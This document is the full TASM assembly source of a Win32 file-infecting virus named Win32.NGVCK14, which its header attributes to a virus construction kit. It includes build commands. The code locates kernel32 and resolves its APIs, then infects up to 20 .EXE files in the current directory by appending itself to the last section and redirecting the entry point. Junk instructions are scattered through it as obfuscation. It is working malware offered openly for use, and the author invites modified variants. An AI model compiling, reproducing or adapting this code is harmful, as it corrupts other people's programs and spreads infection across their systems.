              
;
;
; Win32.NGVCK14 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK14
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : Byte Comparison Type I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 29
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m2 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 mov edx, dword ptr [esp]
                                        ; add esp, 4
 inc esp
 add esp, 3d
 sub edx, offset Delta
                                        ; mov ebp, edx
 push edx
 pop ebp
 jmp KernelSearchStart
 adc edx, 98358450d                     ; Trash


;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov edx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], edx

 push dword ptr [ebp+OldBase]
 pop edx

 mov dword ptr [ebp+retBase], edx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
                                        ; add ebp, 1
 add ebp, 1d
 dec ebp
 jz FirstGenHost
 mov eax,12345678h
 org $-4
 retBase dd 0h
 add eax,12345678h
 org $-4
 retEIP dd 0h
 jmp eax



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov edx, 80000000h or 40000000h
 push edx
 lea edx, [ebp+WFD_szFileName]
 xchg edx, edi

 push edi
 call dword ptr [ebp+XCreateFileA]

 inc eax
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 or edx, 9570631d                       ; Trash
                                        ; clear edx
 sub edx, edx
 add edx, dword ptr [ebp+WFD_nFileSizeLow]
 push edx
 sub ecx, edx                           ; Trash

                                        ; clear ecx
 mov ecx, 0
 push ecx
 push edx
 push ecx
 push 00000004h
 push ecx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop edx
                                        ; add eax, 1
 inc eax
 sub eax, 1
 jz CloseFile
                                        ; clear ecx
 mov ecx, -60912d
 add ecx, 60912d
 push edx
 push ecx
 push ecx
                                        ; mov ebx, 2
 mov ebx, ( 2d - 8d )
 add ebx, 8d
 push ebx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 test eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
 and dword ptr [ebp+Trash1], 255031     ; Trash
                                        ; check for minimum filesize
 lea ecx, [ebp+WFD_nFileSizeLow]
 xchg eax, ecx

 cmp dword ptr [eax], 20000d
 jbe NoInfection
                                        ; get and remove file attributes
 mov edx, offset WFD_szFileName
 add edx, ebp

 push edx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
                                        ; mov ecx, 128
 mov ecx, ( 128d xor 11d )
 xor ecx, 11d
 push ecx
 lea edx, [ebp+WFD_szFileName]


 push edx
 call dword ptr [ebp+XSetFileAttributesA]
 add eax, -1
 add eax, 1
 jz NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; mov eax, -1
 mov eax, ( -1d xor 11d )
 xor eax, 11d
 and eax, dword ptr [ebp+MapAddress]
 mov ebx, ecx                           ; Trash
                                        ; check for ZM
 movzx edx, word ptr [eax]
 sub edx, 'ZM'
 jz Goodfile
                                        ; clear ebx
 sub ebx, ebx
 or ebx, ebx
 jz Notagoodfile

Goodfile:
 cmp word ptr [eax+3Ch], 0h
 je Notagoodfile
 push dword ptr [eax+3Ch]
 pop esi
                                        ; check if header lies inside the file
 cmp esi, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add esi, eax
                                        ; check for PE Header
                                        ; check for EP
 movzx edx, word ptr [esi]
 cmp edx, 'EP'
 je Goodfile2
                                        ; mov edx, 46183
 mov edx, 0
 add edx, 46183d
 cmp edx, 46183d
 je Notagoodfile
 xor dword ptr [ebp+Trash1], 1679046    ; Trash

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [esi+4Ch], 'NGVC'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for OBJ
 mov dx, word ptr [esi+16h]
 and dx, 00002h
 cmp dx, 00002h
 jne Notagoodfile
                                        ; check for DLL
 mov bx, word ptr [esi+16h]
 and bx, 0F000h
 cmp bx, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jc NoInfection2

Notagoodfile:
 call UnMapFile

NoInfection2:

                                        ; restore the file attributes
                                        ; mov ebx, -1
 mov ebx, ( -1d + 18d )
 sub ebx, 18d
 and ebx, dword ptr [ebp+Attributes]
 push ebx
 lea ebx, [ebp+WFD_szFileName]
 xchg ecx, ebx

 push ecx
 call dword ptr [ebp+XSetFileAttributesA]

NoInfection:
ret




;           [ ///// * Outbreak Procedure * \\\\\ ]

 shl eax, 8d                            ; Trash

Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
 push dword ptr [ebp+OldEIP]
 pop esi

 mov dword ptr [ebp+retEIP], esi

 push dword ptr [ebp+Trash1]
 pop edi

 mov dword ptr [ebp+Trash2], edi

 push dword ptr [ebp+OldBase]
 pop eax

 and ebx, eax                           ; Trash
 mov dword ptr [ebp+retBase], 0
 xor dword ptr [ebp+retBase], eax




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea esi, [ebp+filemask]

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 sub eax, -1d
                                        ; add eax, 1
 inc eax
 sub eax, 1
 jz EndInfectCurDir
                                        ; Set Infection Counter
 push 20d
 pop dword ptr [ebp+InfCounter]

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 mov edx, dword ptr [ebp+InfCounter]
 or edx, edx
 jz EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 or eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ecx Lenght of API-Name
                                        ; ebx Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




 push dword ptr [ebp+NTableVA]
 pop edx


SearchNextApi1:                         ; search for the API's
 push edx
 mov eax, dword ptr [edx]
 add eax, [ebp+KernelMZ]
                                        ; mov edx, eax
                                        ; clear edx
 mov edx, -45620d
 add edx, 45620d
 add edx, eax
                                        ; mov esi, edx
 mov esi, edx
 push ecx
 push esi
 mov dword ptr [ebp+TempApisearch3], ebx
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; ebx Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov ah, byte ptr [ebx]
 cmp ah, byte ptr [esi]
 jne ApiNotFound
 dec ecx
 or ecx, ecx
 jz FoundApi1
                                        ; add esi, 1
 sub esi, -1d
                                        ; add ebx, 1
 sub ebx, -1d
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop esi
 pop ecx
 pop edx
 mov ebx, dword ptr [ebp+TempApisearch3]
                                        ; add edx, 4
 add edx, 4d
 inc word ptr [ebp+counter]
 cmp word ptr [ebp+counter], 2001h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 12d
                                        ; retrieve the offset
                                        ; clear edx
 push 0
 pop edx
 mov dx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 clc 
 rcl edx, 1                             ; multiply with 2
 add edx, dword ptr [ebp+OTableVA]
 xchg edx, eax
 movzx edx, word ptr [eax]
 clc
 rcl edx, 2h
 mov dword ptr [ebp+Trash1], 60097      ; Trash
 add edx, dword ptr [ebp+ATableVA]
 add dword ptr [ebp+Trash1], 691638     ; Trash
                                        ; convert to RVA
 push dword ptr [ebp+KernelMZ]
 pop eax
 add eax, dword ptr [edx]
 mov dword ptr [ebp+TempAPI], eax
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edi
 popad
 jmp ExecuteHost



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 push dword ptr [ebp+MapAddress]
 pop esi
                                        ; retrieve PE - Header
 mov eax, [esi+3Ch]
 add eax, esi
                                        ; get File Alignment
 mov ebx, [eax+3Ch]
                                        ; mov edx, -1
 mov edx, -1d
 and edx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 add edx, VirusSize
 mov dword ptr [ebp+AlignReg1], 0
 xor dword ptr [ebp+AlignReg1], edx
 mov dword ptr [ebp+AlignReg2], ebx
 call Align
 mov edx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], 0
 xor dword ptr [ebp+NewSize], edx
 pushad
 Call UnMapFile2
 popad
 push edx
 pop dword ptr [ebp+WFD_nFileSizeLow]
 call CreateMap
 jc NoEXE
 push dword ptr [ebp+MapAddress]
 pop esi
                                        ; retrieve PE - Header again
 mov ebx, esi
 add ebx, dword ptr [esi+3Ch]
                                        ; infect by increasing the last section
 push ebx
 pop esi
 xor ecx, 78786208d                     ; Trash
                                        ; get last section
                                        ; clear eax
 and eax, 0
 mov ax, word ptr [esi+06h]
 add eax, -1
 imul eax, eax, 28h
                                        ; add ebx, 120
 add ebx, 120d
 neg edx                                ; Trash
 add ebx, eax
                                        ; clear edx
 xor edx, edx
 add edx, dword ptr [esi+74h]
 shl edx, 3
 add ebx, edx
 sub ecx, ebx                           ; Trash
                                        ; get old Entrypoint
 mov ecx, dword ptr [esi+34h]
 push ecx
 pop dword ptr [ebp+OldBase]
 mov eax, dword ptr [esi+28h]
 push eax
 pop dword ptr [ebp+OldEIP]
 mov edx, [ebx+10h]
                                        ; mov ecx, edx
                                        ; clear ecx
 mov ecx, 0
 add ecx, edx
 add ebx, 14h
 add edx, [ebx]
 sub ebx, 14h
 push edx
 push ecx
 pop eax
 add eax, [ebx+0Ch]
 mov dword ptr [ebp+NewEIP], -1
 adc dword ptr [ebp+Trash1], edx        ; Trash
 and dword ptr [ebp+NewEIP], eax
                                        ; save new enty point in file
 mov dword ptr [esi+28h], 0
 add dword ptr [esi+28h], eax
                                        ; clear eax
 xor eax, eax

 add eax, [ebx+10h]
 push eax
                                        ; calculate new section size
 push dword ptr  [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 add eax, VirusSize
 mov dword ptr [ebp+AlignReg1], eax
 call Align
 mov eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebx+10h], eax
 pop eax
 add eax,  (VirusSize-1438d)
 add eax, 1438d
 mov dword ptr [ebx+08h], 0
 add dword ptr [ebx+08h], eax
 mov eax, dword ptr [ebx+0Ch]
 add eax, dword ptr [ebx+10h]
 mov dword ptr [esi+50h], 0h
 add dword ptr [esi+50h], eax
                                        ; set write, read and code flag
 or dword ptr [ebx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 mov ecx, VirusSize
 lea esi, [ebp+Virus]

 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 rep movsb
                                        ; decrease Infection Counter
 mov eax, dword ptr [ebp+InfCounter]
 add eax, -1
 mov dword ptr [ebp+InfCounter], -1
 and dword ptr [ebp+InfCounter], eax
 clc
ret

NoEXE:
 stc
ret



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need
 mov esi, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov edx, [esi+78h]
 and dword ptr [ebp+Trash1], edx        ; Trash
 add edx, [ebp+KernelMZ]
                                        ; add edx, 28
 add edx, 28d
                                        ; get ATableVA
 mov esi, dword ptr [edx]
 add esi, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], esi
                                        ; add edx, 4
 inc edx
 add edx, 3d
                                        ; get NTableVA
 mov esi, dword ptr [edx]
 add esi, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], esi
                                        ; add edx, 4
 add edx, 4d
                                        ; get OTableVA
 mov esi, dword ptr [edx]
 add esi, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], esi

                                        ; number of API's we're looking for
 push NumberOfApis
 pop eax

                                        ; load API Names and Offsets
 lea ecx, [ebp+APIOffsets]
 xchg ecx, edi

 mov ebx, offset APINames
 add ebx, ebp


GetApisLoop: 

 push ebx
 pop ecx
APINameDetect:                          ; calculate the lenght of the names
 add ecx, 1d
 cmp byte ptr [ecx], 0
 jne APINameDetect
                                        ; clear the counter
 and word ptr [ebp+counter], 0h

 sub ecx, ebx
                                        ; search 'em
                                        ; ecx contains Name-Lenght
                                        ; ebx points to the Name
                                        ; edi points to the offset

 call SearchAPI1
                                        ; add ebx, 1
 inc ebx
 add ebx, ecx
 push dword ptr [ebp+TempAPI]
 pop edx
 mov dword ptr [edi], edx
                                        ; add edi, 4
 add edi, 4d
 sub eax, 1
 jnz GetApisLoop
 lea ecx, [ebp+Outbreak]
 xchg esi, ecx

 push esi
ret



;          [ ///// * FindFiles Procedure * \\\\\ ]


FindNextFileProc:                       ; find another file
 call ClearOldData
 mov ebx, ebp
 add ebx, offset WIN32_FIND_DATA

 push ebx
 push dword ptr [ebp+FindHandle]
 pop ebx
 push ebx
 call dword ptr [ebp+XFindNextFileA]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
 lea ebx, [ebp+WFD_szFileName]
 xchg ebx, esi

                                        ; mov ecx, 276
 mov ecx, 276d

ClearOldData2:
 mov byte ptr [esi], 0h
                                        ; add esi, 1
 add esi, 1d
 dec ecx
 jnz ClearOldData2
 popad
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea ebx, [ebp+WIN32_FIND_DATA]
 xchg edx, ebx

 push edx
 push esi
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], 0
 add dword ptr [ebp+FindHandle], eax
ret





;                  [ ///// * Data * \\\\\ ]

Data:
 MapAddress  dd 0h
 FindHandle  dd 0h
 TempApisearch3 dd 0h
 NewEIP      dd 0h
 NewSize     dd 0h

 APIOffsets:
 XCloseHandle           dd 0h
 XSetFileAttributesA    dd 0h
 XGetFileAttributesA    dd 0h
 XCreateFileMappingA    dd 0h
 XCreateFileA           dd 0h
 XFindClose             dd 0h
 XFindFirstFileA        dd 0h
 XFindNextFileA         dd 0h
 XUnmapViewOfFile       dd 0h
 XMapViewOfFile         dd 0h

 db 'Win32.NGVCK14 - SnakeByte',0
 InfCounter  dd 0h
 Attributes  dd 0h
 KernelMZ    dd 0h
 OldEIP      dd 0h
 KernelPE    dd 0h
 OTableVA    dd 0h
 counter     dw 0h
 filemask    db '*.EXE',0
 TempAPI     dd 0h
 K32Trys     dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)


 APINames:
 db 'CloseHandle', 0
 db 'SetFileAttributesA', 0
 db 'GetFileAttributesA', 0
 db 'CreateFileMappingA', 0
 db 'CreateFileA', 0
 db 'FindClose', 0
 db 'FindFirstFileA', 0
 db 'FindNextFileA', 0
 db 'UnmapViewOfFile', 0
 db 'MapViewOfFile', 0

 AlignReg2   dd 0h
 OldBase     dd 400000h
 ATableVA    dd 0h
 FileHandle  dd 0h
 NTableVA    dd 0h
 Trash2      dd 0h
 MapHandle   dd 0h
 Trash1      dd 0h
 AlignReg1   dd 0h




;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 mov edx, dword ptr [esp]
 rcl ebx, 15d                           ; Trash
                                        ; round to pages
 xor dx, dx
                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 0
 rcl ebx, 14d                           ; Trash
 add dword ptr [ebp+K32Trys], 6h

GK1:                                    ; check for DOS-EXE Stub
                                        ; mov eax, -1
 mov eax, ( -1d + 9d )
 sub eax, 9d
 and eax, dword ptr [ebp+K32Trys]
 cmp eax, 0h
 jz NoKernel
                                        ; check for ZM
 cmp word ptr [edx], 'ZM'
 je CheckPE

GK2:
 dec edx
 sub edx, 65535d
 dec dword ptr [ebp+K32Trys]
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
                                        ; add edx, 60
 add edx, 60d
 mov esi, [edx]
 dec edx
 sub edx, 59d
 add esi, edx
                                        ; check for EP
 cmp word ptr [esi], 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:

KernelFound:
 mov dword ptr [ebp+KernelPE], esi
 mov dword ptr [ebp+KernelMZ], -1
 inc ecx                                ; Trash
 and dword ptr [ebp+KernelMZ], edx

 jmp GetApis

;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov ecx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 mov edx, 0
 mov eax, dword ptr [ebp+AlignReg1]
 div ecx
 adc ebx, ebx                           ; Trash
                                        ; add eax, 1
 sub eax, -1d
 mul ecx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

